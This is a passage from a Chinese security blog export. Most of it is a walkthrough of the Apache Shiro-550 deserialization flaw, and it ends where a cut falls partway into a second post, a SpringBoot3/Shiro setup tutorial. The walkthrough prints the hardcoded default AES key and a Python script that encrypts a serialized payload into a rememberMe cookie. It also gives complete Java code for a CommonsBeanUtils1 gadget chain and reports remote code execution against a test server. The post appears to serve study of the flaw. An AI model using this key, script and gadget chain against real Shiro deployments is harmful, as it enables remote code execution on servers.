<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，就两个操作，一个是解密，一个是反序列化，因为字节是加密过的，所以我们先把他解密</p>
<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>跟进到decrypt这个函数里，这是一个接口</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213141024753.png" alt="image-20241213141024753"></p>
<p>看他的参数名，第一个叫encrypted,第二个是什么什么key，就可以想到这是一个对称加密算法，是用key去解的，然后我们回到AbstractRememberMeManager，</p>
<p>继续跟进getDecryptionCipherKey</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213141415077.png" alt="image-20241213141415077"></p>
<p>最后找到了这里对key进行赋值，然后看一下谁调用了setDecryptionCipherKey</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213142940377.png" alt="image-20241213142940377"></p>
<p>找到了这里</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143027556.png" alt="image-20241213143027556"></p>
<p>最后再找谁调了setCipherKey</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143125426.png" alt="image-20241213143125426"></p>
<p>发现在AbstractRememberMeManager进行赋值，而这个<strong>DEFAULT_CIPHER_KEY_BYTES</strong>是一个常量</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143210697.png" alt="image-20241213143210697"></p>
<p>点进去发现他是固定了，看到这里对这个漏洞也多少有点眉目了，因为其硬编码了密钥，所以导致了固定key加密，现在我们只要构造一个序列化的payload，然后用AES的key加密，然后base64编码一下，最后想办法走到正常流程里调用反序列化就执行攻击的操作了了</p>
<h1 id="验证（URLDNS链）"><a href="#验证（URLDNS链）" class="headerlink" title="验证（URLDNS链）"></a>验证（URLDNS链）</h1><p>首先用URLDNS链去验证一下漏洞，urldns这条链之前就写过了，运行文件生成payload</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213145858264.png" alt="image-20241213145858264"></p>
<p>拿出来后要对这个文件进行AES加密，然后base64编码，脚本照着组长的抄的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到以下字符串<br><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213152654385.png" alt="image-20241213152654385"></p>
<p>拿到这个payload，替换掉rememberMe，就成功接收到dns回显了</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213153740454.png" alt="image-20241213153740454"></p>
<p>（注意要把JSESSIONID删掉，不然保持登录状态的话代码逻辑是进入不到反序列化的流程的）</p>
<h1 id="CB1链分析"><a href="#CB1链分析" class="headerlink" title="CB1链分析"></a>CB1链分析</h1><p>Shiro是不带有CC的，但是它有CB，趁着这个机会自己写一次CB链</p>
<h2 id="CB简介"><a href="#CB简介" class="headerlink" title="CB简介"></a>CB简介</h2><p>CB链”指的是<strong>一种类似于CC链的攻击链，但使用的是Apache Commons项目中的Commons BeanUtils库</strong>。 Commons BeanUtils库提供了用于操作Java对象的实用工具类，例如BeanMap和BeanComparator等</p>
<h2 id="什么是JavaBean"><a href="#什么是JavaBean" class="headerlink" title="什么是JavaBean"></a>什么是JavaBean</h2><p>JavaBean 是一种JAVA语言写成的可重用组件,它是一个类</p>
<p>所谓javaBean，是指符合如下标准的Java类：</p>
<ul>
<li>类是公共的</li>
<li>有一个无参的公共的构造器</li>
<li>有私有属性，且须有对应的get、set方法去设置属性</li>
<li>对于boolean类型的成员变量，允许使用”is”代替上面的”get”和”set”</li>
</ul>
<p>在java中，有很多类定义都符合这样的规范</p>
<p>比如这样一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> String name; <span class="comment">// 属性一般定义为private</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  <span class="comment">//读方法</span></span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String n)</span> &#123;  <span class="comment">//写方法</span></span><br><span class="line">		name = n;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>它包含了一个私有属性name，以及读取和设置这个属性的两个public方法 getName()和setName()，即getter和setter</p>
<p>这种 class 就是 JavaBean</p>
<p>用于对属性赋值的方法称为属性修改器或setter方法，用于读取属性值的方法称为属性访问器或getter方法</p>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>上面说了CB的用处，比如一个类<code>Person</code>是个<code>JavaBean</code>，它有个<code>name</code>属性，则<code>PropertyUtils.getProperty(new Person(),&quot;name&quot;)</code>则会调用它的<code>getName()</code>方法，那么之前写的CC3里的Templateslmpl的getOutputProperties也是get开头的</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213200255600.png" alt="image-20241213200255600"></p>
<p>我们把CC3的代码粘过来，成功执行了命令,这样就成功找到了反序列化的尾部</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213200151611.png" alt="image-20241213200151611"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="comment">// 反射修改templates的值</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="comment">// 修改_name</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">NameFIeld</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    NameFIeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    NameFIeld.set(templates, <span class="string">&quot;test&quot;</span>); <span class="comment">// 赋值</span></span><br><span class="line">    <span class="comment">// 修改_bytecodes</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">BytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    BytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://temp/classes/Test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    BytecodesField.set(templates,codes);</span><br><span class="line">    <span class="comment">// 修改tfactory</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tFactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tFactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tFactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">PropertyUtilsBean</span> <span class="variable">propertyUtilsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyUtilsBean</span>();</span><br><span class="line">    propertyUtilsBean.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说白了<strong>getProperty</strong>的属性值可以控制的话，就可以任意执行代码，所以还是找反序列化的那个思路，看看哪里调了getProperty</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213205743716.png" alt="image-20241213205743716"></p>
<p>这样就找到了位于BeanComparator类的compare方法，而且property这个属性还是可以控制的，o1是我们传的参数。</p>
<p>继续找谁调用了 compare() 方法，这里就太多了，我们优先去找能够进行序列化的类，于是这里找到了 <code>PriorityQueue</code> 这个类。PriorityQueue<code>这个类的</code>siftDownUsingComparator()<code>方法调用了</code>compare()，继续找谁调用了 <code>siftDownUsingComparator()</code> 方法，发现在同一个类中的 <code>siftDown()</code> 方法调用了它。同样，发现同个类下的 <code>heapify()</code> 方法调用了 <code>siftDown()</code> 方法</p>
<p>,最后在寻找谁调用<strong>heapify</strong>时候，找到了readobejct</p>
<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 反射修改templates的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 修改_name</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">NameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        NameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        NameField.set(templates, <span class="string">&quot;test&quot;</span>); <span class="comment">// 赋值</span></span><br><span class="line">        <span class="comment">// 修改_bytecodes</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">BytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        BytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://temp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        BytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 反射将 property 的值赋为 outputProperties 让他不要在序列化的时候就执行</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">pc</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> pc.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="CB1打Shiro550"><a href="#CB1打Shiro550" class="headerlink" title="CB1打Shiro550"></a>CB1打Shiro550</h1><p>用上面我们写的EXP生成的payload去生成,放到burp里，一样的删除掉JSESSIONID，然后就成功执行了命令，造成了RCE</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213214422589.png" alt="image-20241213214422589"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a class="link" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=333.788.videopod.sections&vd_source=7ee5bc742ad8e76b4536e01b16e6839d">https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=333.788.videopod.sections&amp;vd_source=7ee5bc742ad8e76b4536e01b16e6839d<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1-%E5%B0%BE%E9%83%A8%E9%93%BE%E5%AD%90-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1-%E5%B0%BE%E9%83%A8%E9%93%BE%E5%AD%90-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>Java安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3整合Shiro学习</title>
    <url>/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于我之前学开发的时候所用的安全框架是Spring Security，没有接触过Shiro这个框架，后面需要学习Shiro的若干反序列化漏洞，遂今天来补一下简单的开发知识</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/a93530f246851928efba39664a33008.jpg" alt="a93530f246851928efba39664a33008"></p>
<h1 id="什么是Shiro"><a href="#什么是Shiro" class="headerlink" title="什么是Shiro"></a>什么是Shiro</h1><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，它为开发人员提供了一种直观，全面的身份验证，授权，加密和会话 Management 解决方案。</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/shiro.png" alt="img-Shiro"></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk：18</p>
<p>SpringBoot版本：3.6</p>
<p>IDEA选择Spring Boot作为脚手架</p>
<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208145644783.png" alt="image-20241208145644783"></p>
<p>发现SpringBoot的官方没有整合Shiro框架，遂勾几个常用的库无脑下一步</p>
<h2 id="Maven导入"><a href="#Maven导入" class="headerlink" title="Maven导入"></a>Maven导入</h2><blockquote>
<p>踩坑警告！！！</p>
</blockquote>
<p>网上大部分博客所教程的都是SpringBoot2的版本，在SpringBoot3后强制使用JDK17从jdk8以后javax.servlet的相关代码包名改成了jakarta.servlet，shiro-spring的版本按照各大博客或者狂神的视频copy的都是低版本，在ShiroFilter中因引入的servlet不一致，导致无法解析，所以一定要把旧的sevlet相关依赖删掉</p>
<p>Maven中手动导入Shiro的依赖</p>
<p>SpringBoot3一定要导这个！！！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- shiro --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>jakarta<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 排除仍使用了javax.servlet的依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入适配jakarta的依赖包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>jakarta<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>jakarta<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/08/SpringBoot3%E6%95%B4%E5%90%88Shiro%E5%AD%A6%E4%B9%A0/image-20241208150044916.png" alt="image-20241208150044916"></p>
<h2 id="Controller-index"><a href="#Controller-index" class="headerlink" title="Controller&amp;&amp;index"></a>Controller&amp;&amp;index</h2><p>我们需要一个页面进行Shiro的测试，所以这里新建一个Controller，并解析到相应的页面</p>
<ul>
<li><p>新建一个index页面</p>
